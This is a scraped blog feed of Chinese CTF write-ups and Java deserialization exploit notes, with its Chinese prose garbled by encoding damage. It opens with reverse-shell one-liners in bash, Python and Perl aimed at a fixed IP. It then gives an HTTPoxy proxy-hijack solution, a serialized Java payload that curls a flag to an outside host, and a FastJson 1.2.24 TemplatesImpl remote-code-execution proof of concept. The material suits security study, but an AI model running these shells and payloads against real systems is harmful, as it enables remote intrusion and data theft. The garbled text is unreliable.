L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3NC4wLjIyMi4yMDMvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash 1python3 -c &#39;mport socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.0.222.203&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&quot;&#x2F;bin&#x2F;sh&quot;,&quot;&quot;-i&quot;]);&#39; 1perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;174.0.222.203:1234&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; TimeTravel12345678910111213141516171819202122232425 &lt;?phperror_reporting(0);require __DIR__ . '/vendor/autoload.php';use GuzzleHttp\\Client;highlight_file(__FILE__);if(isset($_GET['flag'])) &#123; $client = new Client(); $response = $client-&gt;get('http://127.0.0.1:5000/api/eligible'); $content = $response-&gt;getBody(); $data = json_decode($content, TRUE); if($data['success'] === true) &#123; echo system('/readflag'); &#125;&#125;if(isset($_GET['file'])) &#123; highlight_file($_GET['file']);&#125;if(isset($_GET['phpinfo'])) &#123; phpinfo();&#125; å­˜åœ¨æ–‡ä»¶è¯»å–ï¼Œå°è¯•/start.sh å¼€å¯äº†php-fpmï¼Œhttp://127.0.0.1:5000/api/eligibleæœåŠ¡å°±æ˜¯è¿™ä¸ª/srv/app.pyæä¾›çš„ 123456789101112131415from flask import Flaskimport datetimeimport jsonapp = Flask(__name__)@app.route('/api/eligible')def source(): current_year = int(datetime.datetime.now().strftime(\"%Y\")) if current_year &lt; 2050: return json.dumps(&#123;\"success\": False&#125;) else: return json.dumps(&#123;\"success\": True&#125;)if __name__ == \"__main__\": app.run(host='127.0.0.1') ä»£ç æ²¡æœ‰æ¼æ´ï¼Œåªèƒ½åˆ©ç”¨ä¸­é—´ä»¶ HTTPoxyæ¼æ´ï¼ˆCVE-2016-5385ï¼‰ éœ€è¦è¿”å›çš„jsonæ•°æ®ä¸­ä¸ºTrueï¼Œå¯å¾—flag ä¼ å…¥ä¸€ä¸ª Proxyå¤´ï¼Œä½¿å…¶äº§ç”Ÿä¸€ä¸ª HTTP_PROXY ç¯å¢ƒå˜é‡ï¼Œè¿™ä¸ªç¯å¢ƒå˜é‡å†è¢«ç¨‹åºé‡Œçš„ GuzzleHttp ä½¿ç”¨ï¼Œå³å¯ä½¿æµé‡èµ°ä»£ç†ï¼Œæ§åˆ¶è¿”å›çš„è¯·æ±‚ã€‚ vpså¼€ä¸ªæœåŠ¡ï¼Œflaské»˜è®¤5000 1234567891011from flask import Flaskimport datetimeimport jsonapp = Flask(__name__)@app.route('/api/eligible')def source(): return json.dumps(&#123;\"success\": True&#125;)if __name__ == \"__main__\": app.run(host='127.0.0.1') æ·»åŠ  Proxy: http://174.0.222.203:5000 ä½†æ˜¯Linuxé¶æœºæ²¡flaskæ¨¡å—ï¼Œç”¨SimpleHTTPServeræ¨¡å— 1234567891011121314from http.server import BaseHTTPRequestHandler, HTTPServerimport jsonclass DemoHttpServer(BaseHTTPRequestHandler): def do_GET(self): self.send_response(200, message='OK') self.send_header('Content-Type', 'application/json') self.end_headers() self.wfile.write(json.dumps(&#123;\"success\": True&#125;).encode()) if __name__ == '__main__': server = HTTPServer(('0.0.0.0', 1234), DemoHttpServer) print('Server is running, user &lt;Ctrl+C&gt; to srop.') server.serve_forever() phpä¹Ÿå¯ï¼Œæ›´æ–¹ä¾¿ 123$arr &#x3D; array(&quot;success&quot;&#x3D;&gt;true);header(&quot;Content-Type:application&#x2F;json&quot;);echo json_encode($arr); å½“å‰ç›®å½•å¯åŠ¨php -S 0:2333 EasySpringMVCç»™äº†waråŒ…ï¼Œè§£å‹ï¼Œ toolsç›®å½•ä¸‹çš„ä¸¤ä¸ªç±»éƒ½å®ç°äº†Serializableï¼Œå…¶ä¸­Toolsç±»è¿˜å®šä¹‰äº†readObject()æ–¹æ³•ï¼Œåœ¨ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è§¦å‘ã€‚ ClientInfoç±»æ˜¯ç”¨æˆ·ä¿¡æ¯ç±»ã€‚ ClentInfoFilterç±»ä¸­å…ˆåˆ¤æ–­cookieä¸­æ˜¯å¦å­˜åœ¨cinfoå­—æ®µï¼Œ æ²¡æœ‰çš„è¯å®ä¾‹åŒ–ä¸€ä¸ªClientInfoï¼Œ 1cinfo &#x3D; new ClientInfo(&quot;Anonymous&quot;, &quot;normal&quot;, ((HttpServletRequest)request).getRequestedSessionId()); base64ç¼–ç ï¼Œè°ƒç”¨Tools.create()è¿›è¡Œåºåˆ—åŒ–ï¼Œå¹¶å­˜å…¥cookieã€‚å¦åˆ™è¿›è¡Œååºåˆ—åŒ– ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶cookieä»è€Œæ§åˆ¶ååºåˆ—åŒ–çš„ç±»ï¼Œè¿™é‡ŒreadObject()å·²ç»è¢«é‡å†™äº† 1(new ProcessBuilder((String[])((String[])obj))).start(); é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡é‡å†™Toolsç±»çš„writeObject()æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œä»è€Œå‘½ä»¤æ‰§è¡Œ payload 123456789101112131415161718192021222324252627package com.tools;import java.io.*;import java.util.Base64;public class Tools implements Serializable &#123; private static final long serialVersionUID = 1L; public static byte[] create(Object obj) throws Exception &#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); &#125; private void writeObject(ObjectOutputStream out) throws IOException &#123; String[] cmd = &#123;\"/bin/sh\",\"-c\",\"curl http://174.0.223.65:2333/`/readflag`\"&#125;; out.writeObject(cmd); &#125; public static void main(String[] args) throws Exception&#123; Base64.Encoder encoder = Base64.getEncoder(); Tools tools = new Tools(); byte[] bytes = Tools.create(tools); System.out.println(encoder.encodeToString(bytes)); &#125;&#125; 1rO0ABXNyAA9jb20udG9vbHMuVG9vbHMAAAAAAAAAAQMAAHhwdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAA3QABy9iaW4vc2h0AAItY3QAKWN1cmwgaHR0cDovLzE3NC4wLjIyMy42NToyMzMzL2AvcmVhZGZsYWdgeA&#x3D;&#x3D; ä¸€å¼€å§‹æˆ‘ä¸å°å¿ƒæŠŠä¸‹é¢çš„åˆ äº†ï¼Œå¯¼è‡´ä¸€ç›´å¤±è´¥ã€‚ private static final long serialVersionUID = 1L; æ·±å…¥äº†è§£åºåˆ—åŒ–writeObjectã€readObjectã€readResolve å‚è€ƒé“¾æ¥ï¼š https://www.zhaoj.in/read-6407.html?tdsourcetag=s_pctim_aiomsg https://cjm00n.top/2020/02/29/V-N%E5%85%AC%E5%BC%80%E8%B5%9B2020-writeup/?tdsourcetag=s_pctim_aiomsg","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"Javaååºåˆ—åŒ–æ¼æ´-FastJson1.2.24","slug":"Javaååºåˆ—åŒ–æ¼æ´-FastJson1.2.24","date":"2020-03-01T05:47:37.000Z","updated":"2020-03-20T13:51:11.502Z","comments":true,"path":"2020/03/01/Javaååºåˆ—åŒ–æ¼æ´-FastJson1.2.24/","link":"","permalink":"https://glotozz.github.io/2020/03/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-FastJson1.2.24/","excerpt":"ååºåˆ—åŒ–æ¼æ´ä¹Ÿæ˜¯Javaååºåˆ—åŒ–æ¼æ´ä¸­æ¯”è¾ƒç»å…¸çš„æ¼æ´","text":"ååºåˆ—åŒ–æ¼æ´ä¹Ÿæ˜¯Javaååºåˆ—åŒ–æ¼æ´ä¸­æ¯”è¾ƒç»å…¸çš„æ¼æ´ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• FastJsonä»‹ç» æ¼æ´åˆ†æ POC æ€»ç»“ å‚è€ƒé“¾æ¥ï¼š FastJsonä»‹ç»ä¸‹è½½ 12345678910111213141516171819&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot; xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt; &lt;groupId&gt;fastjson1224&lt;&#x2F;groupId&gt; &lt;artifactId&gt;test&lt;&#x2F;artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;&#x2F;version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt; &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt; &lt;version&gt;1.2.24&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;&#x2F;dependencies&gt;&lt;&#x2F;project&gt; åºåˆ—åŒ– 1234567891011121314151617import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.serializer.SerializerFeature;public class FJTest &#123; public static void main(String[] args) &#123; Cat cat = new Cat(); cat.setName(\"gqy\"); //åºåˆ—åŒ– String json = JSON.toJSONString(cat); System.out.println(json); //è®¾ç½®SerializerFeature.WriteClassNameå¯å†™å…¥ç±»å String json1 = JSON.toJSONString(cat, SerializerFeature.WriteClassName); System.out.println(json1); //ååºåˆ—åŒ– System.out.println(JSON.parseObject(json1, Cat.class).getName()); &#125;&#125; æ³¨é‡Šæ‰setName()å’ŒsetAge() 12345String s &#x3D; &quot;&#123;\\&quot;@type\\&quot;:\\&quot;Cat\\&quot;,\\&quot;name\\&quot;:\\&quot;gqy\\&quot;&#125;&quot;;Cat cat1 &#x3D; JSON.parseObject(s, Cat.class);System.out.println(cat1.getName()); &#x2F;&#x2F;nullCat cat2 &#x3D; JSON.parseObject(s, Cat.class, Feature.SupportNonPublicField);System.out.println(cat2.getName()); &#x2F;&#x2F;gqy è®¾ç½®Feature.SupportNonPublicFieldå³å¯æ”¯æŒå¯¹è±¡ç±»çš„privateå±æ€§ æ–°åŠ ä¸€ä¸ªå±æ€§properties,è·Ÿè¸ªååºåˆ—åŒ– 12345678910111213141516171819202122232425import java.util.Properties;public class Cat &#123; private String name; private String age; private Properties properties; public String getName() &#123; return name; &#125; public Properties getProperties() &#123; System.out.println(\"getProperties\"); return properties; &#125; public String getAge() &#123; System.out.println(\"getAge\"); return age; &#125; public Cat() &#123; &#125;&#125; 12String s1 &#x3D; &quot;&#123;\\&quot;@type\\&quot;:\\&quot;Cat\\&quot;,\\&quot;name\\&quot;:\\&quot;gqy\\&quot;,\\&quot;properties\\&quot;:&#123;&#125;&#125;&quot;;Cat cat3 &#x3D; JSON.parseObject(s1, Cat.class, Feature.SupportNonPublicField); ç»“æœä¸º 12æ„é€ å‡½æ•°getProperties æ¼æ´åˆ†ææ¼æ´è§¦å‘ç‚¹ä¸º com.sun.org.apache.xalan.internal.xsltc.trax.Templatesï¼Œä½†æ˜¯è¿™ä¸ªåŒ…æˆ‘åœ¨fastjsonä¸­æ²¡æ‰¾åˆ°ï¼Œå´å¯ä»¥æ‰§è¡Œã€‚ å¯ä»¥å€ŸåŠ©ä¸‹é¢çš„ç½‘å€æŸ¥æ‰¾jar https://www.findjar.com/ åœ¨æˆ‘jdk1.8.0._112çš„jre/lib/rt.jarä¸­ï¼Œä¹Ÿæ·»åŠ åˆ°librariesä¸­å³å¯ æœç´¢getOutputProperties() è¿½è¸ªTransformer è¿½è¸ªgetTransletInstance() è¿™é‡Œæœ‰ä¸€ä¸ªå®ä¾‹åŒ–ç±»ï¼Œè¿½è¸ªdefineTransletClasses() ä»_bytecodeså±æ€§ä¸­åŠ è½½ç±»å¯¹è±¡ï¼Œå¹¶ä¸”ä¸Šä¸€æ­¥ä¸­è¦æ±‚è¿™ä¸ªå¯¹è±¡ç»§æ‰¿AbstractTranslet è¿½è¸ªABSTRACT_TRANSLETå¸¸é‡ä¸ºcom.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTransletå’Œå‰é¢çš„å¼ºåˆ¶ç±»è½¬åŒ–ç›¸ç…§åº” åˆ©ç”¨é“¾ 1234567891011JSON.parseObject...JavaBeanDeserializer.deserialze...FieldDeserializer.setValue...TemplatesImpl.getOutputPropertiesTemplatesImpl.newTransformerTemplatesImpl.getTransletInstance...Runtime.getRuntime().exec æ„é€ æˆ‘ä»¬éœ€è¦çš„å®ä¾‹åŒ–å¯¹è±¡ newInstance()ä¼šè‡ªåŠ¨æ‰§è¡Œæ— å‚æ„é€ æ–¹æ³• 123456789101112131415161718import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;public class Test extends AbstractTranslet &#123; public Test()&#123; Runtime.getRuntime().exec(\"calc\"); &#125; //ç»§æ‰¿AbstractTransletéœ€è¦é‡å†™ä¸‹é¢ä¸¤ä¸ªæ–¹æ³• public void transform(DOM dom, SerializationHandler[] serializationHandlers) throws TransletException &#123; &#125; public void transform(DOM dom, DTMAxisIterator dtmAxisIterator, SerializationHandler serializationHandler) throws TransletException &#123; &#125;&#125; fastjson-remote-code-execute-poc è¿˜æœ‰éœ€è¦æ³¨æ„çš„ä¸€ç‚¹ï¼Œä¸èƒ½å°†ç±»å¯¹è±¡ä»¥å­—ç¬¦æµçš„å½¢å¼ä¼ å…¥ï¼Œåœ¨JSONScannerä¸­å­˜åœ¨base64è§£ç  POC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package person;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.io.IOUtils;import org.apache.commons.codec.binary.Base64;import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.IOException;/** * Created by web on 2017/4/29. */public class Poc &#123; public static String readClass(String cls)&#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); try &#123; IOUtils.copy(new FileInputStream(new File(cls)), bos); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return Base64.encodeBase64String(bos.toByteArray()); &#125; public static void test_autoTypeDeny() throws Exception &#123; ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty(\"file.separator\"); final String evilClassPath = System.getProperty(\"user.dir\") + \"\\\\target\\\\classes\\\\person\\\\Test.class\"; String evilCode = readClass(evilClassPath); final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; String text1 = \"&#123;\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\"+evilCode+\"\\\"],\" + \"'_name':'a.b',\" + \"'_tfactory':&#123; &#125;,\" + \"\\\"_outputProperties\\\":&#123; &#125;&#125;\\n\"; System.out.println(text1); //String personStr = \"&#123;'name':\"+text1+\",'age':19&#125;\"; //Person obj = JSON.parseObject(personStr, Person.class, config, Feature.SupportNonPublicField); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); //assertEquals(Model.class, obj.getClass()); &#125; public static void main(String args[])&#123; try &#123; test_autoTypeDeny(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; æ€»ç»“ä¸Šé¢å…¶å®åªæ˜¯fastjsonååºåˆ—åŒ–çš„ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼Œè¿˜æœ‰åŸºäºJDNIï¼ˆè®¾ç½®lookupå±æ€§ï¼‰ã€åŸºäºClassLoaderï¼ˆ æ„é€ classNameä¸ºä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²æ—¶ï¼Œé€šè¿‡è¿™ä¸ªç±»åŠ è½½å™¨æ¥å®ç°å¯¹è‡ªå®šä¹‰ç±»çš„åŠ è½½ ï¼‰çš„åˆ©ç”¨æ–¹å¼ã€‚ æ”¯æŒjdk1.7ï¼Œ1.8 è¯¥pocåªèƒ½è¿è¡Œåœ¨fastjson-1.2.22åˆ°fastjson-1.2.24ç‰ˆæœ¬åŒºé—´ï¼Œå› ä¸ºfastjsonä»1.2.22ç‰ˆæœ¬æ‰å¼€å§‹å¼•å…¥SupportNonPublicFieldã€‚ ä¸è¿‡æ­¤ç§åˆ©ç”¨æ–¹å¼éœ€è¦åœ¨è§£æjsonä¸²æ—¶è®¾ç½®Feature.SupportNonPublicFieldï¼Œè€Œä¸šåŠ¡é€šå¸¸åœ¨ä½¿ç”¨fastjsonæ—¶å¾€å¾€ä¼šç›´æ¥æŒ‰ç…§é»˜è®¤å‚æ•°è°ƒç”¨parseObject()æ–¹æ³•ï¼Œæ‰€ä»¥ç•¥ä¸ºé¸¡è‚‹ã€‚ å‚è€ƒé“¾æ¥ï¼š http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Javaååºåˆ—åŒ–æ¼æ´-Spring RCE","slug":"Javaååºåˆ—åŒ–æ¼æ´-Spring RCE","date":"2020-02-29T01:38:56.000Z","updated":"2020-03-20T13:55:06.149Z","comments":true,"path":"2020/02/29/Javaååºåˆ—åŒ–æ¼æ´-Spring RCE/","link":"","permalink":"https://glotozz.github.io/2020/02/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Spring%20RCE/","excerpt":"ä¸»è¦é€šè¿‡springä¸­çš„ååºåˆ—åŒ–æ¼æ´å’ŒFastJsonååºåˆ—åŒ–æ¼æ´å­¦ä¹ javaååºåˆ—åŒ–åŸç†åŠåˆ©ç”¨","text":"ä¸»è¦é€šè¿‡springä¸­çš„ååºåˆ—åŒ–æ¼æ´å’ŒFastJsonååºåˆ—åŒ–æ¼æ´å­¦ä¹ javaååºåˆ—åŒ–åŸç†åŠåˆ©ç”¨ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• åŸºç¡€çŸ¥è¯† Springååºåˆ—åŒ–æ¼æ´ å‚è€ƒé“¾æ¥ï¼š åŸºç¡€çŸ¥è¯†ä¸ºä»€ä¹ˆä¼šæœ‰åºåˆ—åŒ–å’Œååºåˆ—åŒ–? åˆ©ç”¨ååºåˆ—åŒ–å°†ç¨‹åºè¿è¡Œçš„å¯¹è±¡çŠ¶æ€ä»¥äºŒè¿›åˆ¶å½¢å¼å‚¨å­˜ä¸æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œç„¶åå¯ä»¥åœ¨å¦ä¸€ä¸ªç¨‹åºä¸­å¯¹åºåˆ—åŒ–åçš„å¯¹è±¡çŠ¶æ€æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ¢å¤å¯¹è±¡ã€‚ åºåˆ—åŒ–éœ€è¦æ»¡è¶³çš„ä¸¤ä¸ªæ¡ä»¶ è¯¥ç±»å¿…é¡»å®ç°java.io.Serializableæ¥å£ã€‚ è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåˆ™è¯¥å±æ€§å¿…é¡»æ³¨æ˜æ˜¯çŸ­æš‚çš„ã€‚ ååºåˆ—åŒ–ä»£ç ä¸¾ä¾‹ 1234567891011121314151617181920212223242526272829303132333435import java.io.*;public class SerializeTest &#123; public static void main(String[] args) &#123; Test test = new Test(); test.name = \"gqy\"; test.age = \"18\"; try&#123; // æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶è¾“å…¥æµ FileOutputStream fileOut = new FileOutputStream(\"F:\\\\IdeaProjects\\\\javadeserialization\\\\src\\\\test1.db\"); // å»ºç«‹å¯¹è±¡è¾“å…¥æµ ObjectOutputStream out = new ObjectOutputStream(fileOut); //è¾“å‡ºååºåˆ—åŒ–å¯¹è±¡ out.writeObject(test); out.close(); fileOut.close(); System.out.println(\"Serialized data is saved!!\"); //ååºåˆ—åŒ–æå–å¯¹è±¡ FileInputStream fileIn = new FileInputStream(\"F:\\\\IdeaProjects\\\\javadeserialization\\\\src\\\\test1.db\"); // å»ºç«‹å¯¹è±¡è¾“å…¥æµ ObjectInputStream in = new ObjectInputStream(fileIn); // è¯»å–å¯¹è±¡ Test test1 = null; test1 = (Test) in.readObject(); in.close(); fileIn.close(); System.out.println(test1.name); test1.eat(); &#125;catch (IOException | ClassNotFoundException i)&#123; i.printStackTrace(); &#125; &#125;&#125; æŸ¥çœ‹ä¸‹åºåˆ—åŒ–åçš„æ•°æ®ï¼Œåªèƒ½çœ‹åˆ°ä¸å®Œæ•´çš„ä¿¡æ¯ ååºåˆ—åŒ–æ¼æ´demo åœ¨Javaååºåˆ—åŒ–ä¸­ï¼Œä¼šè°ƒç”¨è¢«ååºåˆ—åŒ–çš„readObjectæ–¹æ³•ï¼Œå½“readObjectæ–¹æ³•ä¹¦å†™ä¸å½“æ—¶å°±ä¼šå¼•å‘æ¼æ´ã€‚ PSï¼šæœ‰æ—¶ä¹Ÿä¼šä½¿ç”¨readUnshared()æ–¹æ³•æ¥è¯»å–å¯¹è±¡ï¼ŒreadUnshared()ä¸å…è®¸åç»­çš„readObjectå’ŒreadUnsharedè°ƒç”¨å¼•ç”¨è¿™æ¬¡è°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„å¯¹è±¡ï¼Œè€ŒreadObjectè¯»å–çš„å¯¹è±¡å¯ä»¥ã€‚ 1234567891011121314151617181920212223242526272829303132import java.io.*;public class test&#123; public static void main(String args[]) throws Exception&#123; UnsafeClass Unsafe = new UnsafeClass(); Unsafe.name = \"hacked by ph0rse\"; FileOutputStream fos = new FileOutputStream(\"object\"); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()æ–¹æ³•å°†Unsafeå¯¹è±¡å†™å…¥objectæ–‡ä»¶ os.writeObject(Unsafe); os.close(); //ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–objå¯¹è±¡ FileInputStream fis = new FileInputStream(\"object\"); ObjectInputStream ois = new ObjectInputStream(fis); //æ¢å¤å¯¹è±¡ UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); &#125;&#125;class UnsafeClass implements Serializable&#123; public String name; //é‡å†™readObject()æ–¹æ³• private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³• in.defaultReadObject(); //æ‰§è¡Œå‘½ä»¤ Runtime.getRuntime().exec(\"calc.exe\"); &#125;&#125; ä¸»è¦æ˜¯è¿™é‡Œçš„é‡å†™äº†readObject() æ¼æ´èµ·æº é‡å†™ObjectInputStreamå¯¹è±¡çš„resolveClassæ–¹æ³•ä¸­çš„æ£€æµ‹å¯è¢«ç»•è¿‡ã€‚ ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„ç±»è¿›è¡Œé»‘åå•æ§åˆ¶ã€‚è™½ç„¶Javaçš„è¯­è¨€ä¸¥è°¨æ€§è¦æ¯”PHPå¼ºçš„å¤šï¼Œä½†åœ¨å¤§å‹åº”ç”¨ä¸­æƒ³è¦é‡‡ç”¨é»‘åå•æœºåˆ¶ç¦ç”¨æ‰æ‰€æœ‰å±é™©çš„å¯¹è±¡å‡ ä¹æ˜¯ä¸å¯èƒ½çš„ã€‚å› æ­¤ï¼Œå¦‚æœåœ¨å®¡è®¡è¿‡ç¨‹ä¸­å‘ç°äº†é‡‡ç”¨é»‘åå•è¿›è¡Œè¿‡æ»¤çš„ä»£ç ï¼Œå¤šåŠå­˜åœ¨ä¸€ä¸¤ä¸ªâ€˜æ¼ç½‘ä¹‹é±¼â€™å¯ä»¥åˆ©ç”¨ã€‚å¹¶ä¸”é‡‡å–é»‘åå•æ–¹å¼ä»…ä»…å¯èƒ½ä¿è¯æ­¤åˆ»çš„å®‰å…¨ï¼Œè‹¥åœ¨åæœŸæ·»åŠ äº†æ–°çš„åŠŸèƒ½ï¼Œå°±å¯èƒ½å¼•å…¥äº†æ–°çš„æ¼æ´åˆ©ç”¨æ–¹å¼ã€‚æ‰€ä»¥ä»…é é»‘åå•æ˜¯æ— æ³•ä¿è¯åºåˆ—åŒ–è¿‡ç¨‹çš„å®‰å…¨çš„ã€‚ åŸºç¡€åº“ä¸­éšè—çš„ååºåˆ—åŒ–æ¼æ´ 2015å¹´ç”±é»‘å®¢Gabriel Lawrenceå’ŒChris Frohoffå‘ç°çš„â€˜Apache Commons Collectionsâ€™ç±»åº“ç›´æ¥å½±å“äº†WebLogicã€WebSphereã€JBossã€Jenkinsã€OpenNMSç­‰å¤§å‹æ¡†æ¶ã€‚ç›´åˆ°ä»Šå¤©è¯¥æ¼æ´çš„å½±å“ä»æœªæ¶ˆæ•£ã€‚å­˜åœ¨å±é™©çš„åŸºç¡€åº“ï¼š 123456789101112commons-fileupload 1.3.1commons-io 2.4commons-collections 3.1commons-logging 1.2commons-beanutils 1.9.2org.slf4j:slf4j-api 1.7.21com.mchange:mchange-commons-java 0.2.11org.apache.commons:commons-collections 4.0com.mchange:c3p0 0.9.5.2org.beanshell:bsh 2.0b5org.codehaus.groovy:groovy 2.3.9org.springframework:spring-aop 4.1.4.RELEASE Springååºåˆ—åŒ–æ¼æ´é¦–å…ˆéœ€è¦äº†è§£JAVAä½“ç³»ä¸­çš„RMIä»¥åŠJNDI RMIï¼ˆRemote Method Invocationï¼‰ å³Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œä¸€ç§ç”¨äºå®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼Œå¸¸è§çš„ä¸¤ç§æ¥å£å®ç°ä¸ºJRMPï¼ˆJava Remote Message Protocolï¼ŒJavaè¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®ï¼‰ä»¥åŠCORBAã€‚ JNDI (Java Naming and Directory Interface)æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºè®¾è®¡çš„APIï¼Œä¸ºå¼€å‘äººå‘˜æä¾›äº†æŸ¥æ‰¾å’Œè®¿é—®å„ç§å‘½åå’Œç›®å½•æœåŠ¡çš„é€šç”¨ã€ç»Ÿä¸€çš„æ¥å£ã€‚JNDIæ”¯æŒçš„æœåŠ¡ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼šDNSã€LDAPã€ CORBAå¯¹è±¡æœåŠ¡ã€RMIç­‰ã€‚ ç®€å•è¯´å°±æ˜¯RMIæ³¨å†Œçš„æœåŠ¡å¯ä»¥è®©JNDIåº”ç”¨ç¨‹åºæ¥è®¿é—®ã€‚ JNDI RCEæ¼æ´äº§ç”Ÿçš„åŸå› å°±åœ¨äºå½“æˆ‘ä»¬åœ¨æ³¨å†ŒRMIæœåŠ¡æ—¶ï¼Œå¯ä»¥æŒ‡å®šcodebase urlï¼Œä¹Ÿå°±æ˜¯è¿œç¨‹è¦åŠ è½½ç±»çš„ä½ç½®ï¼Œè®¾ç½®è¯¥å±æ€§å¯ä»¥è®©JDNIåº”ç”¨ç¨‹åºåœ¨åŠ è½½æ—¶åŠ è½½æˆ‘ä»¬æŒ‡å®šçš„ç±» ( ä¾‹å¦‚ï¼šhttp://www.iswin.org/xx.class) ï¼Œè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„ç‚¹ï¼Œä¹Ÿæ˜¯è§¦å‘æ¶æ„ä»£ç çš„ç‚¹ï¼Œå½“JNDIåº”ç”¨ç¨‹åºé€šè¿‡lookup(rmiæœåŠ¡çš„åœ°å€)è°ƒç”¨æŒ‡å®šcodebase urlä¸Šçš„ç±»åï¼Œä¼šè°ƒç”¨è¢«è¿œç¨‹è°ƒç”¨ç±»çš„æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å°†æ¶æ„ä»£ç æ”¾åœ¨è¢«è¿œç¨‹è°ƒç”¨ç±»çš„æ„é€ æ–¹æ³•ä¸­æ—¶ï¼Œæ¼æ´å°±ä¼šè§¦å‘ã€‚ RMIæµ‹è¯•demo 1234567Registry registry &#x3D; LocateRegistry.createRegistry(1999);&#x2F;&#x2F; è®¾ç½®code url è¿™é‡Œå³ä¸ºhttp:&#x2F;&#x2F;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;&#x2F;&#x2F; 